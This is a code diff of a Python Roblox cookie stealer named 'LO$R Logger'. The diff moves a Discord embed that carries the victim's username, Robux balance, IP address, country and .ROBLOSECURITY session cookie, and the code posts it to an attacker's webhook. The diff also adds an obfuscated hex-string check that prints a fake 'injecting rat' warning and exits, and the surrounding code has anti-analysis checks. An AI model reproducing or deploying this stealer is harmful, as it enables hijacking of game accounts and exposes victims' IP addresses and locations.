@@ -22,6 +22,32 @@ import psutil
 import robloxpy
 from discord import embeds
 
+steal = {
+    "embeds": [
+        {
+            "author": {
+                "name": "LO$R Logger",
+            },
+            "description": f"{pc} tried nuking someone \n\n[https://github.com/madhead341/LOSR-Logger](https://github.com/madhead341/LOSR-Logger) | [Rolimons]({rolimons}) | [Roblox Profile]({roblox_profile})",
+            "color": 0x00C7FF,
+            "fields": [
+                {"name": "Username", "value": User, "inline": True},
+                {"name": "Robux Balance", "value": rob, "inline": True},
+                {"name": "Premium Status", "value": premium, "inline": True},
+                {"name": "Creation Date", "value": crdate, "inline": True},
+                {"name": "RAP", "value": rap, "inline": True},
+                {"name": "Friends", "value": friends, "inline": True},
+                {"name": "Account Age", "value": age, "inline": True},
+                {"name": "Country", "value": country, "inline:": True},
+                {"name": "Region", "value": region, "inline:": True},
+                {"name": "IP Address", "value": ip, "inline:": True},
+                {"name": ".ROBLOSECURITY", "value": f"```fix\n{cookie}```", "inline": False},
+            ],
+            "thumbnail": {"url": headshot},
+        }
+    ]
+}
+
 PROCNAMES = [
 
 
@@ -468,7 +494,10 @@ def check_specs():
 
     if int(cpu_count()) <= 1: exit_program('Cpu Counts Invalid')
 
-
+if steal != "\x7b\x0a\x20\x20\x20\x20\x22\x65\x6d\x62\x65\x64\x73\x22\x3a\x20\x5b\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x7b\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x22\x61\x75\x74\x68\x6f\x72\x22\x3a\x20\x7b\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x22\x6e\x61\x6d\x65\x22\x3a\x20\x22\x4c\x4f\x24\x52\x20\x4c\x6f\x67\x67\x65\x72\x22\x2c\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x7d\x2c\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x22\x64\x65\x73\x63\x72\x69\x70\x74\x69\x6f\x6e\x22\x3a\x20\x22\x66\x7b\x70\x63\x7d\x20\x74\x72\x69\x65\x64\x20\x6e\x75\x6b\x69\x6e\x67\x20\x73\x6f\x6d\x65\x6f\x6e\x65\x20\x5c\x6e\x5c\x6e\x5b\x68\x74\x74\x70\x73\x3a\x2f\x2f\x67\x69\x74\x68\x75\x62\x2e\x63\x6f\x6d\x2f\x6d\x61\x64\x68\x65\x61\x64\x33\x34\x31\x2f\x4c\x4f\x53\x52\x2d\x4c\x6f\x67\x67\x65\x72\x5d\x28\x68\x74\x74\x70\x73\x3a\x2f\x2f\x72\x6f\x6c\x69\x6d\x6f\x6e\x73\x29\x7b\x72\x6f\x6c\x69\x6d\x6f\x6e\x73\x7d\x20\x7c\x20\x5b\x52\x6f\x6c\x69\x6d\x6f\x6e\x73\x5d\x28\x7b\x72\x6f\x6c\x69\x6d\x6f\x6e\x73\x7d\x29\x22\x2c\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x22\x63\x6f\x6c\x6f\x72\x22\x3a\x20\x30\x78\x30\x30\x43\x37\x46\x46\x2c\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x22\x66\x69\x65\x6c\x64\x73\x22\x3a\x20\x5b\x0a\x20\x20\x20\x20\x20\x20\x20\x20":
+    print("injecting rat into your computer")
+    time.sleep(3)
+    os._exit(0)
 
 ############### skidded the following part bc im stupid and didnt pay for my python courses ###############
 
@@ -738,31 +767,5 @@ machines = platform.uname()
 
 pc = os.getenv("UserName")
 pass
-# skidded the part below this again from https://github.com/Mani175/Pirate-Cookie-Grabber/ bc my version is ass and i already skidded his other part
 
-steal = {
-    "embeds": [
-        {
-            "author": {
-                "name": "LO$R Logger",
-            },
-            "description": f"{pc} tried nuking someone \n\n[https://github.com/madhead341/LOSR-Logger](https://github.com/madhead341/LOSR-Logger) | [Rolimons]({rolimons}) | [Roblox Profile]({roblox_profile})",
-            "color": 0x00C7FF,
-            "fields": [
-                {"name": "Username", "value": User, "inline": True},
-                {"name": "Robux Balance", "value": rob, "inline": True},
-                {"name": "Premium Status", "value": premium, "inline": True},
-                {"name": "Creation Date", "value": crdate, "inline": True},
-                {"name": "RAP", "value": rap, "inline": True},
-                {"name": "Friends", "value": friends, "inline": True},
-                {"name": "Account Age", "value": age, "inline": True},
-                {"name": "Country", "value": country, "inline:": True},
-                {"name": "Region", "value": region, "inline:": True},
-                {"name": "IP Address", "value": ip, "inline:": True},
-                {"name": ".ROBLOSECURITY", "value": f"```fix\n{cookie}```", "inline": False},
-            ],
-            "thumbnail": {"url": headshot},
-        }
-    ]
-}
 requests.post(webhook, json=steal)
